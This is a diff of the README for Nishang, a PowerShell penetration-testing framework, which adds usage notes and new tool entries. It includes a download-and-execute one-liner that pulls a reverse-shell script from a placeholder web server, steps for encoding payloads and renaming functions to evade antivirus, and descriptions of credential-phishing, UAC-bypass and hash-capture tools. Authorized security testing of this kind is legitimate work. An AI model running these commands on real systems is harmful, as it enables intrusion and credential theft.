@@ -1,7 +1,56 @@
 #Nishang
 
-###Nishang is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security and penetration testing. Nishang is useful during various phases of a penetration test and is most powerful for post exploitation usage.
+###Nishang is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security, penetration testing and red teaming. Nishang is useful during all phases of penetration testing.
 By [nikhil_mitt](https://twitter.com/nikhil_mitt)
+
+####Usage
+
+Import all the scripts in the current PowerShell session (PowerShell v3 onwards).
+
+PS C:\nishang> Import-Module .\nishang.psm1
+
+Use the individual scripts with dot sourcing.
+
+PS C:\nishang> . C:\nishang\Gather\Get-Information.ps1
+
+PS C:\nishang> Get-Information
+
+To get help about any script or function, use:
+
+PS C:\nishang> Get-Help [scriptname] -full
+
+Note that the help is available for the function loaded after running the script and not the script itself since version 0.3.8. In all cases, the function name is same as the script name.
+
+For example, to see the help about Get-WLAN-Keys.ps1, use
+
+PS C:\nishang> . C:\nishang\Get-WLAN-Keys.ps1
+
+PS C:\nishang> Get-Help Get-WLAN-Keys -Full
+
+####Anti Virus
+Nishang scripts are flagged by many Anti Viruses as malicious. The scrripts on a target are meant to be used in memory which is very easy to do with PowerShell. Two basic methods to execute PowerShell scripts in memory:
+
+Method 1. Use the in-memory dowload and execute:
+Use below command to execute a PowerShell script from a remote shell, meterpreter native shell, a web shell etc. and the function exported by it. All the scripts in Nishang export a function with same name in the current PowerShell session.
+
+powershell iex (New-Object Net.WebClient).DownloadString('http://<yourwebserver>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.]
+
+Method 2. Use the -encodedcommand (or -e) parameter of PowerShell
+All the scripts in Nishang export a function with same name in the current PowerShell session. Therefore, make sure the function call is made in the script itself while using encodedcommand parameter from a non-PowerShell shell. For above example, add a function call (without quotes) "Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.]".
+
+Encode the scrript using Invoke-Encode from Nishang:
+PS C:\nishang> . \nishang\Utility\Invoke-Encode
+PS C:\nishang> Invoke-Encode -DataToEncode C:\nishang\Shells\Invoke-PowerShellTcp.ps1 -OutCommand
+Encoded data written to .\encoded.txt
+Encoded command written to .\encodedcommand.txt
+
+From above, use the encoded script from encodedcommand.txt and run it on a target where commands could be executed (a remote shell, meterpreter native shell, a web shell etc.). Use it like below:
+
+C:\Users\target> powershell -e [encodedscript]
+
+If the scripts still get detected changing the function and parameter names and removing the help content will help.
+
+
 ####Scripts
 Nishang currently contains the following scripts and payloads.
 
@@ -60,6 +109,10 @@ Create signed JAR files which can be used with applets for script and command ex
 
 Create shortcut files capable of executing commands and scripts.
 
+[Out-WebQuery](https://github.com/samratashok/nishang/blob/master/Client/Out-WebQuery.ps1)
+
+Create IQY files for phishing credentials and SMB hashes.
+
 
 #####Escalation
 [Enable-DuplicateToken](https://github.com/samratashok/nishang/blob/master/Escalation/Enable-DuplicateToken.ps1)
@@ -69,6 +122,10 @@ When SYSTEM privileges are required.
 [Remove-Update](https://github.com/samratashok/nishang/blob/master/Escalation/Remove-Update.ps1)
 
 Introduce vulnerabilities by removing patches.
+
+[Invoke-PsUACme](https://github.com/samratashok/nishang/blob/master/Escalation/Invoke-PsUACme.ps1)
+
+Bypass UAC.
 
 #####Execution
 [Download-Execute-PS](https://github.com/samratashok/nishang/blob/master/Execution/Download-Execute-PS.ps1)
@@ -128,6 +185,14 @@ Log keystrokes from a target.
 [Invoke-MimikatzWdigestDowngrade](https://github.com/samratashok/nishang/blob/master/Gather/Invoke-MimikatzWDigestDowngrade.ps1)
 
 Dump user passwords in plain on Windows 8.1 and Server 2012
+
+[Get-PassHints](https://github.com/samratashok/nishang/blob/master/Gather/Get-PassHints.ps1)
+
+Get password hints of Windows users from a target.
+
+[Show-TargetScreen](https://github.com/samratashok/nishang/blob/master/Gather/Show-TargetScreen.ps1)
+
+Connect back and Stream target screen using MJPEG.
 
 #####Pivot
 [Create-MultipleSessions](https://github.com/samratashok/nishang/blob/master/Pivot/Create-MultipleSessions.ps1)
@@ -238,34 +303,14 @@ Encode and compress a script or string.
 
 Decode and decompress a script or string from Invoke-Encode.
 
+[Start-CaptureServer](https://github.com/samratashok/nishang/blob/master/Utility/Start-CaptureServer.ps1)
+
+Run a web server which logs Basic authentication and SMB hashes.
+
 [Base64ToString]
 [StringToBase64]
 [ExetoText]
 [TexttoExe]
-
-####Usage
-
-Import all the scripts in the current PowerShell session (PowerShell v3 onwards).
-
-PS > Import-Module .\nishang.psm1
-
-Use the individual scripts with dot sourcing.
-
-PS > . C:\nishang\Gather\Get-Information.ps1
-
-PS > Get-Information
-
-To get help about any script, use:
-
-PS > Get-Help [scriptname] -full
-
-Note that the help is available for the function loaded after running the script and not the script itself since version 0.3.8. In all cases, the function name is same as the script name.
-
-For example, to see the help about Get-WLAN-Keys.ps1, use
-
-PS> . C:\nishang\Get-WLAN-Keys.ps1
-
-PS> Get-Help Get-WLAN-Keys
 
 
 ####Updates
